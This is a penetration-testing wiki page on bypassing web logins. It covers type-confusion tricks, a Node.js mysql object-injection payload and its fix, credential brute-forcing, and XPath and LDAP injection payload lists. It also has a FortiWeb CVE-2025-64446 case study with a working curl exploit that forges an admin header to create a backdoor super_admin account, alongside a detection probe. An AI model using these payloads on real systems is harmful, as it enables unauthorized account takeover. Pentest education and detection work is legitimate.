# Login Bypass

{{#include ../../banners/hacktricks-training.md}}

## **Bypass regular login**

If you find a login page, here you can find some techniques to try to bypass it:

- Check for **comments** inside the page (scroll down and to the right?)
- Check if you can **directly access the restricted pages**
- Check to **not send the parameters** (do not send any or only 1)
- Check the **PHP comparisons error:** `user[]=a&pwd=b` , `user=a&pwd[]=b` , `user[]=a&pwd[]=b`
- **Change content type to json** and send json values (bool true included)
  - If you get a response saying that POST is not supported you can try to send the **JSON in the body but with a GET request** with `Content-Type: application/json`
- Check nodejs potential parsing error (read [**this**](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)): `password[password]=1`
  - Nodejs will transform that payload to a query similar to the following one: ` SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` `**`password=password=1`**`;` which makes the password bit to be always true.
  - If you can send a JSON object you can send `"password":{"password": 1}` to bypass the login.
  - Remember that to bypass this login you still need to **know and send a valid username**.
  - **Adding `"stringifyObjects":true`** option when calling `mysql.createConnection` will eventually b**lock all unexpected behaviours when `Object` is passed** in the parameter.
- Check credentials:
  - [**Default credentials**](../../generic-hacking/brute-force.md#default-credentials) of the technology/platform used
  - **Common combinations** (root, admin, password, name of the tech, default user with one of these passwords).
  - Create a dictionary using **Cewl**, **add** the **default** username and password (if there is) and try to brute-force it using all the words as **usernames and password**
  - **Brute-force** using a bigger **dictionary (**[**Brute force**](../../generic-hacking/brute-force.md#http-post-form)**)**

### SQL Injection authentication bypass

[Here you can find several tricks to bypass the login via **SQL injections**](../sql-injection/index.html#authentication-bypass).

In the following page you can find a **custom list to try to bypass login** via SQL Injections:


{{#ref}}
sql-login-bypass.md
{{#endref}}

### No SQL Injection authentication bypass

[Here you can find several tricks to bypass the login via **No SQL Injections**](../nosql-injection.md#basic-authentication-bypass)**.**

As the NoSQL Injections requires to change the parameters value, you will need to test them manually.

### XPath Injection authentication bypass

[Here you can find several tricks to bypass the login via **XPath Injection.**](../xpath-injection.md#authentication-bypass)

```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```

### LDAP Injection authentication bypass

[Here you can find several tricks to bypass the login via **LDAP Injection.**](../ldap-injection.md#login-bypass)

```
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```

### Remember Me

If the page has "**Remember Me**" functionality check how is it implemented and see if you can abuse it to **takeover other accounts**.

### Redirects

Pages usually redirects users after login, check if you can alter that redirect to cause an [**Open Redirect**](../open-redirect.md). Maybe you can steal some information (codes, cookies...) if you redirect the user to your web.

## Case Study: Fortinet FortiWeb REST-to-CGI auth bypass (CVE-2025-64446)

FortiWeb’s management plane chains a customized Apache (`httpsd`) front-end with an internal CGI binary (`/cgi-bin/fwbcgi`) that applies configuration changes. The front-end forwards REST paths such as `/api/v2.0/cmdb/system/admin` to `fwbcgi` and copies the original URI and a private `CGIINFO` header that encodes the authenticated identity. In vulnerable builds, URI normalization allows external clients to reach `/cgi-bin/fwbcgi`, and the backend blindly trusts any `CGIINFO` value, so an unauthenticated attacker can impersonate the built-in `admin` account and invoke privileged CMDB operations.

### Attack surface recap

- **Routing confusion:** If `/cgi-bin` is not explicitly denied, sending `/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi` causes `httpsd` to normalize `../` segments and still forward the request to `fwbcgi` while keeping the original REST-looking path in the environment.
- **Trusted identity header:** `fwbcgi` decodes `CGIINFO`, a Base64 JSON blob such as `eyJ1c2VybmFtZSI6ImFkbWluIiwicHJvZm5hbWUiOiJzdXBlcl9hZG1pbiIsInZkb20iOiJyb290IiwibG9naW5uYW1lIjoiYWRtaW4ifQ==` (`{"username":"admin","profname":"super_admin","vdom":"root","loginname":"admin"}`) and never verifies its origin.
- **Standard CMDB payloads:** Once the context is forged, the attacker can call ordinary REST resources (create admin, disable policies, pull certificates, etc.) to obtain long-term control.

### Exploitation workflow

1. **Reach the CGI dispatcher:** Send a POST request to a valid REST endpoint followed by `%3F/../../../../../cgi-bin/fwbcgi` to survive front-end validation while resolving to the CGI binary.
2. **Inject the internal identity:** Craft a Base64 JSON object with the desired profile (`super_admin` in the `root` VDOM) and place it in the `CGIINFO` header.
3. **Perform the privileged action:** Reuse the normal CMDB schema to register a backdoor account or change settings. Example payload:

```bash
curl -k -X POST \
  'https://TARGET/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi' \
  -H 'Content-Type: application/json' \
  -H 'CGIINFO: eyJ1c2VybmFtZSI6ImFkbWluIiwicHJvZm5hbWUiOiJzdXBlcl9hZG1pbiIsInZkb20iOiJyb290IiwibG9naW5uYW1lIjoiYWRtaW4ifQ==' \
  -d '{"data":[{"name":"support","password":"Sup3rComplex!","profile":"super_admin","trusthost":"0.0.0.0/0"}]}'
```

### Safe detection & tooling

- Omit the body and send only the crafted path + `CGIINFO` header to test exposure without touching the configuration:

```bash
curl -ik -X POST \
  'https://TARGET/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi' \
  -H 'CGIINFO: eyJ1c2VybmFtZSI6ImFkbWluIiwicHJvZm5hbWUiOiJzdXBlcl9hZG1pbiIsInZkb20iOiJyb290IiwibG9naW5uYW1lIjoiYWRtaW4ifQ=='
```

  - `200 OK` → the forged context was accepted (device vulnerable).
  - `403 Forbidden` → patched `httpd.conf` is blocking direct access to `/cgi-bin`.
- Bishop Fox released [fortiweb-auth-bypass-check](https://github.com/BishopFox/fortiweb-auth-bypass-check), a scanner that automates the probe and reports exposure without creating accounts.

## Other Checks

- Check if you can **enumerate usernames** abusing the login functionality.
- Check if **auto-complete** is active in the password/**sensitive** information **forms** **input:** `<input autocomplete="false"`

## Automatic Tools

- [HTLogin](https://github.com/akinerkisa/HTLogin)

## References

- [Bishop Fox - Fortinet FortiWeb Authentication Bypass – CVE-2025-64446](https://bishopfox.com/blog/fortinet-fortiweb-authentication-bypass-cve-2025-64446)
- [Bishop Fox - fortiweb-auth-bypass-check](https://github.com/BishopFox/fortiweb-auth-bypass-check)

{{#include ../../banners/hacktricks-training.md}}
